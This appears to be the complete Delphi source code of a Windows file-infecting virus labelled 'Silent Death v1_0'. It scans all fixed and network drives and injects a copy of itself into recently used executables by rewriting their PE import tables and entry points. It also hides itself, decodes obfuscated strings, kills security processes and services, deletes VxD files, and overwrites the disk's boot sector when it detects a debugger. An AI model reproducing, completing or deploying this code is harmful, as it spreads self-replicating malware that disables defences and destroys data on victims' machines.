{$E EXE}
{$IMAGEBASE $00400000}
{$R-}
{$Q-}
{$R vcode.res}
{release 1}
{$IFDEF minimum}
program VMain;
{$ENDIF}
unit VMain;
interface
implementation

uses
  Windows, RTL, ObjList2, winsvc, tlhelp32;

const
  VName: PWideChar = '%Silent%Death%v1_0%';
  VMutex: PChar = '%WINDIR%!SYSTEM!OLESERVER_';
  fnName: PChar = 'RegisterServiceProcess';
  kernel32: PChar = 'kernel32.dll';

  max_funcs = 5;

  hints: array[0..5] of WORD =
    (
    $002F, $004D, $0060, $01A5, $01DE, $0384
    );

  impcode: array[0..14] of BYTE =
    (
    $6A, $00, $FF, $15, $00, $40, $42, $00, $B8, $30, $40, $42, $00, $FF, $E0
    );

  max_vxds = 10;
  vxdnames: array[0..122] of BYTE =
    (
    $7D, $7C, $0D, $7A, $63, $63, $67, $5D, $6F, $70, $5B, $16, $71, $70, $01, $6E,
    $50, $66, $5F, $6B, $54, $59, $0B, $66, $65, $F6, $63, $45, $5B, $54, $FA, $F5,
    $01, $5C, $5B, $EC, $59, $41, $44, $F1, $EC, $F8, $53, $52, $E3, $50, $44, $42,
    $38, $34, $32, $40, $ED, $48, $47, $D8, $45, $36, $26, $3C, $28, $3C, $E3, $3E,
    $3D, $CE, $3B, $2C, $1C, $32, $1E, $28, $1E, $D8, $33, $32, $C3, $30, $21, $11,
    $27, $0F, $1F, $CE, $29, $28, $B9, $26, $08, $1E, $17, $0D, $07, $11, $10, $16,
    $C1, $1C, $1B, $AC, $19, $FB, $11, $0A, $00, $00, $04, $03, $FE, $B4, $0F, $0E,
    $9F, $0C, $FD, $ED, $03, $F5, $01, $02, $ED, $9C, $A7
    );

  max_processes = 5;
  toolz: array[0..67] of BYTE =
    (
    $71, $72, $60, $74, $64, $5F, $70, $08, $5C, $70, $5A, $16, $65, $6A, $5A, $55,
    $66, $07, $02, $FC, $50, $64, $4E, $0A, $59, $5A, $54, $47, $48, $5C, $53, $F0,
    $44, $58, $42, $FE, $43, $43, $47, $3D, $44, $45, $45, $E4, $38, $4C, $36, $F2,
    $41, $46, $36, $31, $42, $DA, $2E, $42, $2C, $E8, $37, $37, $39, $23, $37, $D0,
    $24, $38, $22, $DE
    );

  max_services = 4;
  Services: array[0..59] of BYTE =
    (
    $52, $50, $46, $42, $40, $4E, $1B, $4B, $49, $3F, $3B, $39, $47, $42, $47, $12,
    $57, $37, $47, $F9, $54, $40, $EB, $5E, $28, $39, $30, $E6, $50, $23, $31, $21,
    $26, $23, $31, $FE, $3C, $52, $4B, $3B, $3A, $F8, $40, $35, $4B, $3F, $20, $20,
    $18, $24, $1C, $20, $3E, $0F, $1D, $20, $10, $09, $0A, $E6
    );

type
  WORDBUF = array[0..0] of WORD;
  PWORDBUF = ^WORDBUF;

  DWORDBUF = array[0..0] of DWORD;
  PDWORDBUF = ^DWORDBUF;

  _IMAGE_IMPORT_DESCRIPTOR = record
    OriginalFirstThunk: DWORD;
    TimeDateStamp: DWORD;
    ForwarderChain: DWORD;
    Name: DWORD;
    FirstThunk: DWORD;
  end;
  IMAGE_IMPORT_DESCRIPTOR = _IMAGE_IMPORT_DESCRIPTOR;
  PIMAGE_IMPORT_DESCRIPTOR = ^_IMAGE_IMPORT_DESCRIPTOR;

  IIMPDBUF = array[0..0] of IMAGE_IMPORT_DESCRIPTOR;
  PIIMPDBUF = ^IIMPDBUF;

  SECTIONBUF = array[0..0] of IMAGE_SECTION_HEADER;
  PSECTIONBUF = ^SECTIONBUF;

var
  k: DWORD;
  name: LBuf;
  IsDebuggerPresent: function(): BOOL; stdcall;
  sections: array[0..1] of PChar;
  secnames: array[0..15] of BYTE = ($0F, $61, $71, $72, $64, $67, $6B, $1A, $07, $3F, $3B, $35, $49, $33, $05, $12);

  fnlist: array[0..max_funcs] of PChar;
  funcs: array[0..85] of BYTE =
    (
    $62, $4C, $4C, $4F, $40, $64, $3A, $48, $3D, $44, $3A, $16, $56, $46, $36, $31,
    $45, $33, $55, $35, $39, $2F, $4A, $0A, $4A, $3A, $2A, $25, $39, $27, $53, $34,
    $2E, $21, $22, $2F, $2E, $3B, $FB, $3F, $1C, $2C, $48, $2A, $14, $26, $27, $25,
    $21, $37, $1D, $14, $1A, $2B, $EB, $2F, $0C, $1C, $3C, $0D, $13, $08, $10, $17,
    $12, $24, $06, $10, $00, $FD, $0F, $07, $0B, $0F, $16, $D6, $2A, $06, $FA, $06,
    $F4, $16, $F6, $FA, $F0, $CC
    );

  procname: array[0..17] of BYTE =
    (
    $68, $51, $63, $41, $3F, $4F, $40, $3F, $3C, $4A, $67, $48, $38, $45, $36, $40,
    $45, $10
    );

  fd1: WIN32_FIND_DATA;
  textbuf: array[0..MAX_PATH - 1] of char;

  pdosh: ^IMAGE_DOS_HEADER;
  pfileh: ^IMAGE_FILE_HEADER;
  popth: ^IMAGE_OPTIONAL_HEADER;
  psections: PSECTIONBUF;

  FileBuf_self: pointer;
  FileSize_self: DWORD;

  CountOfModules, CountOfFunctions, SizeOfModNames, SizeOfFuncNames, filesz: DWORD;

procedure DecodeBuffer(pbuf: PChar; size: DWORD);
var
  c: DWORD;
begin
  for c := 0 to size - 1 do
    pbuf[c] := char((not BYTE(pbuf[c]) - c) xor $DE);
end;

procedure UnFuckThis();
const
  mbrfuck: array[0..18] of BYTE =
    (
    $0E, $0E, $07, $1F, $B8, $01, $03, $BB, $00, $02, $B9, $01, $00, $BA, $80, $00,
    $CD, $13, $C3
    );
  mbrfucker: array[0..5] of BYTE =
    (
    $10, $0E, $40, $4B, $48, $1C
    );
  diskpart0: array[0..18] of BYTE =
    (
    $7D, $7C, $0D, $7A, $6D, $64, $72, $6B, $60, $59, $56, $62, $59, $66, $5A, $68,
    $54, $00, $0F
    );
var
  f1: THANDLE;
  bytesIO: DWORD;
  buf: array[0..511] of BYTE;
  ms: OSVERSIONINFO;
  textbuf: array[0..1023] of char;
  textbuf2: FBuf;
begin
  ms.dwOSVersionInfoSize := sizeof(ms);
  GetVersionEx(ms);
  if ms.dwPlatformId = VER_PLATFORM_WIN32_WINDOWS then
  begin
    memcopy(@textbuf, @mbrfucker, sizeof(mbrfucker));
    DecodeBuffer(textbuf, sizeof(mbrfucker));
    f1 := CreateFile(textbuf, GENERIC_WRITE, FILE_SHARE_READ, nil, FILE_ATTRIBUTE_HIDDEN, 0, 0);
    WriteFile(f1, mbrfuck, sizeof(mbrfuck), bytesIO, nil);
    CloseHandle(f1);
    GetCurrentDirectory(MAX_PATH - 1, textbuf2);
    _exec(textbuf, textbuf2);
    DeleteFile(textbuf);
  end else
  begin
    memcopy(@textbuf, @diskpart0, sizeof(diskpart0));
    DecodeBuffer(textbuf, sizeof(diskpart0));
    f1 := CreateFile(textbuf, GENERIC_READ or GENERIC_WRITE, FILE_SHARE_READ or FILE_SHARE_WRITE, nil, OPEN_EXISTING, 0, 0);
    WriteFile(f1, buf, 512, bytesIO, nil);
    CloseHandle(f1);
  end;
end;

function GetFileOffset(vptr: DWORD): DWORD;
var
  c, vaddr: DWORD;
begin
  for c := 0 to pfileh^.NumberOfSections - 1 do
  begin
    vaddr := psections^[c].VirtualAddress;
    if (vaddr <= vptr) and (psections^[c].SizeOfRawData + vaddr > vptr) then
    begin
      result := psections^[c].PointerToRawData + vptr - vaddr;
      exit;
    end;
  end;
  result := 0;
end;

function InsertEPCode(lpImg: PChar; vtext_addr: DWORD): BOOL;
var
  c, vaddr: DWORD;
begin
  vaddr := popth^.AddressOfEntryPoint;
  for c := 0 to pfileh^.NumberOfSections - 1 do
    with psections^[c] do
      if (VirtualAddress <= vaddr) and (VirtualAddress + SizeOfRawData > vaddr) then
        if Misc.VirtualSize + 15 <= SizeOfRawData then
        begin
          popth^.AddressOfEntryPoint := VirtualAddress + Misc.VirtualSize;
          vaddr := GetFileOffset(VirtualAddress + Misc.VirtualSize);
          memcopy(lpImg + vaddr, @impcode, 15);
          PDWORD(lpImg + vaddr + 4)^ := vtext_addr;
          PDWORD(lpImg + vaddr + 9)^ := vtext_addr + $00000030;
          Misc.VirtualSize := SizeOfRawData;
          result := true;
          exit;
        end;
  result := false;
end;

function IsEmptyEntry(lpImp: PIMAGE_IMPORT_DESCRIPTOR): BOOL;
begin
  with lpImp^ do
    result := (OriginalFirstThunk or TimeDateStamp or ForwarderChain or
      Name or FirstThunk) = 0;
end;

function GetEntryFunctionsCount(lpImg: PChar; lpImp: PIMAGE_IMPORT_DESCRIPTOR): DWORD;
var
  p: PDWORDBUF;
begin
  result := lpImp^.OriginalFirstThunk;
  if result = 0 then result := lpImp^.FirstThunk;
  p := pointer(GetFileOffset(result) + lpImg);
  result := 0;
  while p^[result] <> 0 do
    inc(result);
end;

procedure CalcImportSizes(lpImg, idata: PChar);
var
  p: DWORD;
  p2: PDWORDBUF;
  pFName: PChar;
begin
  CountOfModules := 1;
  CountOfFunctions := 6;
  SizeOfModNames := align2(strlenA(kernel32) + 1);
  SizeOfFuncNames := 0;
  for p := 0 to 5 do
    inc(SizeOfFuncNames, align2(strlenA(fnlist[p]) + 3));

  while not IsEmptyEntry(pointer(idata)) do
  begin
    inc(CountOfModules);
    p := PIMAGE_IMPORT_DESCRIPTOR(idata)^.OriginalFirstThunk;
    if p = 0 then p := PIMAGE_IMPORT_DESCRIPTOR(idata)^.FirstThunk;
    pFName := lpImg + GetFileOffset(PIMAGE_IMPORT_DESCRIPTOR(idata)^.Name);
    inc(SizeOfModNames, align2(strlenA(pFName) + 1));

    p2 := pointer(lpImg + GetFileOffset(p));
    p := 0;
    while p2^[p] <> 0 do
    begin
      if (p2^[p] and $80000000) = 0 then
      begin
        pFName := lpImg + GetFileOffset(p2^[p]) + 2;
        inc(SizeOfFuncNames, align2(strlenA(pFName) + 3));
      end;
      inc(CountOfFunctions);
      inc(p);
    end;
    idata := idata + sizeof(IMAGE_IMPORT_DESCRIPTOR);
  end;
end;

procedure ProcessImports(lpImg, idata, pnew: PChar; vaddr, vaddr2: DWORD);
var
  c, t, k: DWORD;
  pModTable: PIIMPDBUF;
  pFuncTable, psFuncTable: PDWORDBUF;
  p, pModNames, pFuncNames: PChar;
begin
  pModTable := pointer(pnew);
  pFuncTable := pointer(pnew + (CountOfModules + 1) * sizeof(IMAGE_IMPORT_DESCRIPTOR));
  pModNames := PChar(pFuncTable) + (CountOfFunctions + CountOfModules) * 4;
  pFuncNames := pModNames + SizeOfModNames;

  for c := 0 to CountOfModules - 2 do
  begin
    pModTable^[c].OriginalFirstThunk := DWORD(pFuncTable) - DWORD(pnew) + vaddr;
    pModTable^[c].TimeDateStamp := $FFFFFFFF;
    pModTable^[c].ForwarderChain := $FFFFFFFF;
    pModTable^[c].Name := DWORD(pModNames - pnew) + vaddr;
    pModTable^[c].FirstThunk := PIMAGE_IMPORT_DESCRIPTOR(idata)^.FirstThunk;

    k := PIMAGE_IMPORT_DESCRIPTOR(idata)^.OriginalFirstThunk;
    if k = 0 then k := PIMAGE_IMPORT_DESCRIPTOR(idata)^.FirstThunk;
    psFuncTable := pointer(lpImg + GetFileOffset(k));

    k := GetEntryFunctionsCount(lpImg, pointer(idata));

    if k > 0 then
      for t := 0 to k - 1 do
        if (psFuncTable^[t] and $80000000) = 0 then
        begin
          p := lpImg + GetFileOffset(psFuncTable^[t]);
          pFuncTable^[t] := DWORD(pFuncNames - pnew) + vaddr;
          PWORD(pFuncNames)^ := PWORD(p)^;
          inc(p, 2);
          strcpyA(pFuncNames + 2, p);
          pFuncNames := pFuncNames + align2(strlenA(p) + 3);
        end
        else
          pFuncTable^[t] := psFuncTable^[t];

    pFuncTable := @pFuncTable^[k + 1];
    strcpyA(pModNames, lpImg + GetFileOffset(PIMAGE_IMPORT_DESCRIPTOR(idata)^.Name));
    pModNames := pModNames + align2(strlenA(pModNames) + 1);
    idata := idata + sizeof(IMAGE_IMPORT_DESCRIPTOR);
  end;

  for t := 0 to 5 do
  begin
    p := fnlist[t];
    pFuncTable^[t] := DWORD(pFuncNames - pnew) + vaddr;
    PWORD(pFuncNames)^ := hints[t];
    strcpyA(pFuncNames + 2, p);
    pFuncNames := pFuncNames + align2(strlenA(p) + 3);
  end;

  with pModTable^[CountOfModules - 1] do
  begin
    OriginalFirstThunk := DWORD(pFuncTable) - DWORD(pnew) + vaddr;
    TimeDateStamp := $FFFFFFFF;
    ForwarderChain := $FFFFFFFF;
    Name := DWORD(pModNames - pnew) + vaddr;
    FirstThunk := vaddr2;
    strcpyA(pModNames, kernel32);
  end;
end;

procedure AddSection(const sName: PChar; vaddr, vsize, rawaddr, rawsize, flags: DWORD);
begin
  with psections^[pfileh^.NumberOfSections] do
  begin
    strcpyA(@Name, sName);
    Misc.VirtualSize := vsize;
    VirtualAddress := vaddr;
    SizeOfRawData := rawsize;
    PointerToRawData := rawaddr;
    PointerToRelocations := 0;
    PointerToLinenumbers := 0;
    NumberOfRelocations := 0;
    NumberOfLinenumbers := 0;
    Characteristics := flags;
  end;
  inc(pfileh^.NumberOfSections);
  inc(popth^.SizeOfImage, align(vsize, popth^.SectionAlignment));
end;

procedure RebuildImportScn(fobj: THANDLE; lpImg: PChar);
var
  ep0, p0, rawsz, praw_new, vsz_new, vaddr_new, vaddr_code, bytesIO: DWORD;
  buf, res: PChar;
begin
  p0 := GetFileOffset(popth^.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
  CalcImportSizes(lpImg, lpImg + p0);

  vsz_new := (CountOfModules + 1) * sizeof(IMAGE_IMPORT_DESCRIPTOR) +
    (CountOfFunctions + CountOfModules) * 4 + SizeOfModNames + SizeOfFuncNames;
  rawsz := align(vsz_new, popth^.FileAlignment);

  buf := pointer(LocalAlloc(LPTR, rawsz));

  with psections^[pfileh^.NumberOfSections - 1] do
  begin
    vaddr_new := VirtualAddress + align(Misc.VirtualSize, popth^.SectionAlignment);
    praw_new := PointerToRawData + SizeOfRawData;
  end;

  AddSection(sections[1], vaddr_new, vsz_new, praw_new, rawsz,
    IMAGE_SCN_CNT_INITIALIZED_DATA or IMAGE_SCN_MEM_READ);
  vaddr_code := vaddr_new + align(vsz_new, popth^.SectionAlignment);
  ep0 := popth^.AddressOfEntryPoint;

  if not InsertEPCode(lpImg, vaddr_code + popth^.ImageBase) then
  begin
    LocalFree(HLOCAL(buf));
    exit;
  end;
//    popth^.AddressOfEntryPoint := vaddr_code + $00000030;
  AddSection(sections[0], vaddr_code, align(256 + FileSize_self, popth^.SectionAlignment),
    praw_new + rawsz, align(256 + FileSize_self, popth^.FileAlignment),
    IMAGE_SCN_CNT_CODE or IMAGE_SCN_CNT_INITIALIZED_DATA or
    IMAGE_SCN_MEM_READ or IMAGE_SCN_MEM_WRITE or IMAGE_SCN_MEM_EXECUTE);

  ProcessImports(lpImg, lpImg + p0, buf, vaddr_new, vaddr_code);

  with popth^.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT] do
  begin
    VirtualAddress := vaddr_new;
    Size := vsz_new;
  end;

  with popth^.DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT] do
  begin
    VirtualAddress := 0;
    Size := 0;
  end;

  SetFilePointer(fobj, 0, nil, FILE_BEGIN);
  _WriteFile(fobj, lpImg, filesz, @bytesIO, nil);
  SetFilePointer(fobj, praw_new, nil, FILE_BEGIN);
  _WriteFile(fobj, buf, rawsz, @bytesIO, nil);
  LocalFree(HLOCAL(buf));

  res := LockResource(LoadResource(0, FindResource(0, 'PACKAGEINFO', RT_RCDATA)));
  buf := pointer(LocalAlloc(LPTR, align(256 + FileSize_self, popth^.FileAlignment)));
  memcopy(buf, res, 256);

  memcopy(buf + 256, FileBuf_self, FileSize_self);
  PDWORD(buf + $0000001C)^ := ep0 + popth^.ImageBase;
  PDWORD(buf + $0000008B)^ := FileSize_self;

  _WriteFile(fobj, buf, align(256 + FileSize_self, popth^.FileAlignment), @bytesIO, nil);
  LocalFree(HLOCAL(buf));
end;

function ProcessFile(const inFile: PChar): BOOL;
var
  f: THANDLE;
  filebuf: PChar;
  bytesIO: DWORD;
  t0: FILETIME;
begin
  result := false;
  f := CreateFile(inFile, GENERIC_READ or GENERIC_WRITE, FILE_SHARE_READ, nil,
    OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, 0);

  asm
    pushfd
    pushad
    xor ecx, ecx
    mov k, esp
  @@1:
    call @@2
    jmp @@3
  @@2:
    push dword ptr fs:[ecx]
    mov fs:[ecx], esp
    mov [ecx], ecx
    jmp @@1
  @@3:
    mov esp, k
    popad
    popfd
  end;

  if f = INVALID_HANDLE_VALUE then exit;
  GetFileTime(f, nil, nil, @t0);

  filesz := GetFileSize(f, nil);
  if filesz > 16777216 then filesz := 16777216;

  if filesz < sizeof(IMAGE_DOS_HEADER) + IMAGE_SIZEOF_FILE_HEADER +
    IMAGE_SIZEOF_NT_OPTIONAL_HEADER then
  begin
    CloseHandle(f);
    exit;
  end;
  filebuf := pointer(LocalAlloc(LPTR, filesz));
  if filebuf = nil then
  begin
    CloseHandle(f);
    exit;
  end;
  _ReadFile(f, filebuf, filesz, @bytesIO, nil);
  pdosh := pointer(filebuf);
  if pdosh^.e_magic <> IMAGE_DOS_SIGNATURE then
  begin
    CloseHandle(f);
    LocalFree(HLOCAL(filebuf));
    exit;
  end;
  pfileh := pointer(filebuf + 4 + pdosh^._lfanew);
  if DWORD(pdosh^._lfanew + 4) > filesz then
  begin
    CloseHandle(f);
    LocalFree(HLOCAL(filebuf));
    exit;
  end;
  if PDWORD(filebuf + pdosh^._lfanew)^ <> IMAGE_NT_SIGNATURE then
  begin
    CloseHandle(f);
    LocalFree(HLOCAL(filebuf));
    exit;
  end;
  popth := pointer(PChar(pfileh) + IMAGE_SIZEOF_FILE_HEADER);
  if (pfileh^.SizeOfOptionalHeader <> IMAGE_SIZEOF_NT_OPTIONAL_HEADER)
    or (popth^.Magic <> IMAGE_NT_OPTIONAL_HDR_MAGIC) then
  begin
    CloseHandle(f);
    LocalFree(HLOCAL(filebuf));
    exit;
  end;
  psections := pointer(PChar(popth) + IMAGE_SIZEOF_NT_OPTIONAL_HEADER);
  if strcmpA(@psections^[pfileh^.NumberOfSections - 1].Name, sections[0]) = 0 then
  begin
    CloseHandle(f);
    LocalFree(HLOCAL(filebuf));
    Sleep(4096);
    exit;
  end;
  if (popth^.AddressOfEntryPoint = 0) or
    (popth^.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress = 0) or
    (popth^.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size <= 20) or
    (popth^.Subsystem = IMAGE_SUBSYSTEM_NATIVE)
    then
  begin
    CloseHandle(f);
    LocalFree(HLOCAL(filebuf));
    exit;
  end;

  asm
    pushfd
    pushad
    xor ecx, ecx
    mov k, esp
  @@1:
    call @@2
    jmp @@3
  @@2:
    push dword ptr fs:[ecx]
    mov fs:[ecx], esp
    db $0f, $0b
    jmp @@1
  @@3:
    mov esp, k
    popad
    popfd
  end; 

  RebuildImportScn(f, filebuf);
  SetFileTime(f, nil, nil, @t0);
  CloseHandle(f);
  LocalFree(HLOCAL(filebuf));
  result := true;
end;

procedure ScanDirs(const lpDirName: PChar; lpList: PSTRList); stdcall;
var
  fdh: THANDLE;
  c, k, c0: integer;
  dirbuf: array[0..MAX_PATH - 1] of char;

  procedure addtolist();
  begin
    if (fd1.dwFileAttributes and FILE_ATTRIBUTE_DIRECTORY <> 0) and
      (fd1.cFileName[0] <> '.') then
    begin
      strcpyA(textbuf, dirbuf);
      strcatA(textbuf, fd1.cFileName);
      STRListAdd(lpList, textbuf);
      k := k + 1;
    end;
  end;

begin
  strcpyA(dirbuf, lpDirName);
  k := strlenA(dirbuf);
  if k > 0 then
    if dirbuf[k - 1] <> '\' then
    begin
      dirbuf[k] := '\';
      dirbuf[k + 1] := #0;
      inc(k);
    end;
  strcpyA(textbuf, dirbuf);
  textbuf[k] := '*';
  textbuf[k + 1] := #0;
  k := 0;
  fdh := FindFirstFile(textbuf, fd1);
  addtolist();

  while FindNextFile(fdh, fd1) do
    addtolist();
  FindClose(fdh);

  c0 := lpList^.FCount;
  for c := c0 - k to c0 - 1 do
    ScanDirs(lpList^.ptrs.FBuffer^[c], lpList);
end;

procedure ScanEXEFiles(lpDirList, lpFileList: PSTRList); stdcall;
var
  fdh: THANDLE;
  tr, tcur: int64;
  c: integer;

  procedure addtolist();
  begin
    if fd1.dwFileAttributes and FILE_ATTRIBUTE_DIRECTORY = 0 then
    begin
      strcpyA(textbuf, lpDirList^.ptrs.FBuffer^[c]);
      strcatA(textbuf, '\');
      strcatA(textbuf, fd1.cFileName);
      tr := tcur - int64(fd1.ftLastAccessTime);
      if tr <= $0000058028E44000 then STRListAdd(lpFileList, textbuf); //7 days
             //$000000C92A69C000 1 day in FILETIME format
    end;
  end;

begin
  GetSystemTimeAsFileTime(FILETIME(tcur));
  for c := 0 to lpDirList^.FCount - 1 do
  begin
    strcpyA(textbuf, lpDirList^.ptrs.FBuffer^[c]);
    strcatA(textbuf, '\*');
    fdh := FindFirstFile(textbuf, fd1);
    if fdh = INVALID_HANDLE_VALUE then continue;
    addtolist();
    while FindNextFile(fdh, fd1) do
      addtolist();
    FindClose(fdh);
  end;
end;

type
  PEXCEPTION_POINTERS = ^_EXCEPTION_POINTERS;

function OnException(ExceptionInfo: PEXCEPTION_POINTERS): LONGINT; stdcall;
begin
  ExitProcess($0000DEAD);
  result := 0;
end;

procedure AntiDebug();
asm
    pushfd
    pushad
    xor ecx, ecx
    mov k, esp
  @@1:
    call @@2
    jmp @@3
  @@2:
    push dword ptr fs:[ecx]
    mov fs:[ecx], esp
    db $f1
    jmp @@1
  @@3:

    xor ecx, ecx
  @@4:
    call @@5
    jmp @@6
  @@5:
    push dword ptr fs:[ecx]
    mov fs:[ecx], esp
    div ecx
    jmp @@4
  @@6:

    xor ecx, ecx
  @@7:
    call @@8
    jmp @@9
  @@8:
    push dword ptr fs:[ecx]
    mov fs:[ecx], esp
    mov edx, ecx
    inc edx
    div edx
    jmp @@7
  @@9:

    xor ecx, ecx
  @@10:
    call @@11
    jmp @@12
  @@11:
    push dword ptr fs:[ecx]
    mov fs:[ecx], esp
    db $0f, $0b
    jmp @@10
  @@12:

    xor ecx, ecx
  @@13:
    call @@14
    jmp @@15
  @@14:
    push dword ptr fs:[ecx]
    mov fs:[ecx], esp
    mov [ecx], ecx
    jmp @@13
  @@15:

    xor ecx, ecx
  @@16:
    call @@17
    jmp @@18
  @@17:
    push dword ptr fs:[ecx]
    mov fs:[ecx], esp
    jmp @@16
  @@18:

    xor ecx, ecx
  @@19:
    call @@20
    jmp @@21
  @@20:
    push dword ptr fs:[ecx]
    mov fs:[ecx], esp
    pushfd
    or dword ptr [esp], $00000100
    popfd
    jmp @@19
  @@21:

    xor ecx, ecx
  @@22:
    call @@23
    jmp @@24
  @@23:
    push dword ptr fs:[ecx]
    mov fs:[ecx], esp
    int 3
    jmp @@22
  @@24:
    mov esp, k
    popad
    popfd
end;

procedure StopMonitors(os: boolean);
var
  t: integer;
  ss: SERVICE_STATUS;
  sch, sh: SC_HANDLE;
  shothandle: HANDLE;
  tmp: PROCESSENTRY32;
  textbuf: array[0..1023] of char;
  p1: PChar;

  procedure _terminate();
  var
    i: integer;
    h: cardinal;
  begin
    asm
      pushfd
      pushad
      xor ecx, ecx
      mov k, esp
    @@1:
      call @@2
      jmp @@3
    @@2:
      push dword ptr fs:[ecx]
      mov fs:[ecx], esp
      mov edx, ecx
      inc edx
      div edx
      jmp @@1
    @@3:
      mov esp, k
      popad
      popfd
    end;  
    p1 := textbuf;
    for i := 0 to max_processes do
    begin
      if strcmpiA(tmp.szExeFile, p1) = 0 then
      begin
        if os and (i = 3) then continue;
        h := OpenProcess(PROCESS_TERMINATE, false, tmp.th32ProcessID);
        TerminateProcess(h, $DEAD);
        CloseHandle(h);
      end;
      p1 := p1 + strlenA(p1) + 1;
    end;
  end;

begin
  if @IsDebuggerPresent <> nil then
    if IsDebuggerPresent() then UnFuckThis();

  p1 := textbuf;
  asm
    pushfd
    pushad
    xor ecx, ecx
    mov k, esp
  @@1:
    call @@2
    jmp @@3
  @@2:
    push dword ptr fs:[ecx]
    mov fs:[ecx], esp
    div ecx
    jmp @@1
  @@3:
    mov esp, k
    popad
    popfd
  end;
  if os then
  begin
    //9x
    memcopy(@textbuf, @vxdnames, sizeof(vxdnames));
    DecodeBuffer(textbuf, sizeof(vxdnames));
    for t := 0 to max_vxds do
    begin
      DeleteFile(p1);
      p1 := p1 + strlenA(p1) + 1;
    end
  end
  else
  begin
    //NT
    sch := OpenSCManager(nil, nil, SC_MANAGER_ALL_ACCESS);

    memfill(@textbuf, 260, $FF);
    memcopy(@textbuf, @Services, sizeof(Services));
    DecodeBuffer(textbuf, sizeof(Services));

    for t := 0 to max_services do
    begin
      sh := OpenService(sch, p1, SERVICE_ALL_ACCESS);
      ControlService(sh, SERVICE_CONTROL_STOP, ss);
      CloseServiceHandle(sh);
      p1 := p1 + strlenA(p1) + 1;
    end;

    CloseServiceHandle(sch);
  end;
  memzero(@textbuf, sizeof(vxdnames));

  shothandle := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  tmp.dwSize := sizeof(tagPROCESSENTRY32);

  asm
    pushfd
    pushad
    xor ecx, ecx
    mov k, esp
  @@1:
    call @@2
    jmp @@3
  @@2:
    push dword ptr fs:[ecx]
    mov fs:[ecx], esp
    int 3
    jmp @@1
  @@3:
    mov esp, k
    popad
    popfd
  end;

  memcopy(@textbuf, @toolz, sizeof(toolz));
  DecodeBuffer(textbuf, sizeof(toolz));

  if Process32First(HANDLE(shothandle), @tmp) then
  begin
    _terminate();
    while Process32Next(HANDLE(shothandle), @tmp) do
      _terminate();
  end;
  CloseHandle(THANDLE(shothandle));
  memzero(@textbuf, sizeof(toolz));
end;

function CheckDrive(const lpRootPathName: PAnsiChar): BOOL;
begin
  result := (GetDriveType(lpRootPathName) = DRIVE_FIXED) or
    (GetDriveType(lpRootPathName) = DRIVE_REMOTE);
end;

procedure main();
var
  osv: OSVERSIONINFO;
  mutex1, f: THANDLE;
  RegisterServiceProcess: function(dwProcessId: DWORD; dwType: DWORD): DWORD; stdcall;
  dirs, files: TSTRList;
  c: integer;
  fName, pdrive: PChar;
  attr: DWORD;
  drives: array[0..MAX_PATH - 1] of char;

  procedure _NextDrive();
  begin
    pdrive := strendA(pdrive) + 1;
    if pdrive^ = #0 then
    begin
      pdrive := drives;
      GetLogicalDriveStrings(MAX_PATH, drives);
    end;
  end;

  procedure NextDrive();
  begin
    _NextDrive();
    while not CheckDrive(pdrive) do _NextDrive();
  end;

begin
  SetUnhandledExceptionFilter(@OnException);

  SetLastError(0);
  mutex1 := CreateMutex(nil, true, VMutex);
  if mutex1 = 0 then exit;
  if GetLastError() = ERROR_ALREADY_EXISTS then
  begin
    CloseHandle(mutex1);
    exit;
  end;

  GetCmdLineParam(0, textbuf);
  f := CreateFile(textbuf, GENERIC_READ, FILE_SHARE_READ, nil,
    OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, 0);
  FileSize_self := GetFileSize(f, nil);
  FileBuf_self := pointer(LocalAlloc(LPTR, FileSize_self));
  ReadFile(f, FileBuf_self^, FileSize_self, attr, nil);
  CloseHandle(f);

  osv.dwOSVersionInfoSize := sizeof(OSVERSIONINFO);
  GetVersionEx(osv);
  if osv.dwPlatformId = VER_PLATFORM_WIN32_WINDOWS then
  begin
    RegisterServiceProcess := GetProcAddress(GetModuleHandle(kernel32), fnName);
    RegisterServiceProcess(0, 1);
  end;
  Sleep(1024);
  asm
    pushfd
    pushad
    xor ecx, ecx
    mov k, esp
  @@1:
    call @@2
    jmp @@3
  @@2:
    push dword ptr fs:[ecx]
    mov fs:[ecx], esp
    db $f1
    jmp @@1
  @@3:
    mov esp, k
    popad
    popfd
  end;
  DecodeBuffer(@funcs, sizeof(funcs));
  fName := @funcs;
  for c := 0 to max_funcs do
  begin
    fnlist[c] := fName;
    fName := fName + strlenA(fName) + 1;
  end;

  DecodeBuffer(@procname, sizeof(procname));
  IsDebuggerPresent := GetProcAddress(GetModuleHandle(kernel32), @procname);

  DecodeBuffer(@secnames, sizeof(secnames));
  fName := @secnames;
  for c := 0 to 1 do
  begin
    sections[c] := fName;
    fName := fName + strlenA(fName) + 1;
  end;

  pdrive := drives;
  GetLogicalDriveStrings(MAX_PATH, drives);
  if not CheckDrive(pdrive) then NextDrive();

  while true do
  begin
    STRListCreate(@dirs);
    STRListCreate(@files);
    ScanDirs(pdrive, @dirs);
    ScanEXEFiles(@dirs, @files); // all EXE accessed in last 7 days
    STRListDestroy(@dirs);

    for c := 0 to files.FCount - 1 do
    begin
      StopMonitors(osv.dwPlatformId = VER_PLATFORM_WIN32_WINDOWS);
      fName := files.ptrs.FBuffer^[c];
      attr := GetFileAttributes(fName);
      if attr <> $FFFFFFFF then
      begin
        SetFileAttributes(fName, FILE_ATTRIBUTE_NORMAL);
        if not ProcessFile(fName) then
        begin
          SetFileAttributes(fName, attr);
          continue;
        end;
        SetFileAttributes(fName, attr);
      end;
      Sleep(4096);
      if @IsDebuggerPresent <> nil then
        if IsDebuggerPresent() then UnFuckThis();
    end;
    STRListDestroy(@files);
    NextDrive();
  end;
end;

begin
  Antidebug();
  main();
  strcpyW(name, 'Enjoi the ');
  strcatW(name, VName);
  ExitProcess(0);
end.

